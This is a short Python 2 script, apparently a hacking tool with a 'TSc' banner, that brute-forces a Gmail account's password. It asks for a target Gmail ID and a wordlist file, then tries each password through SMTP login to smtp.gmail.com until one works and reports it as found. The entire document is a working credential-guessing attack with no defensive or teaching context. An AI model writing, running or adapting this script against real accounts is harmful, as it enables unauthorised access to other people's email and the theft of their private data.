#!/bin/python2
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("\033[3;4;37mTSc\033[0;0;00m \033[37mEnter(\033[31mtarget/gmail/id\033[37m)> \033[00m")

print ""

passswfile= raw_input("\033[3;4;37mTSc\033[0;0;00m \033[37mEnter(\033[31mpath/passwor/list\033[37m)> \033[00m")

passswfile = open(passswfile, "r")

for password in passswfile:
    try:
        smtpserver.login(user, password)

        print "\033[32m[\033[34m*\033[32m]\033[34m Password Found =\033[37m %s" % (password)
        break

    except smtplib.SMTPAuthenticationError:
        print "\033[37m[\033[31m!\033[37m]Failed\033[31m :: \033[37mPassword Is Wrong = %s " % (password)
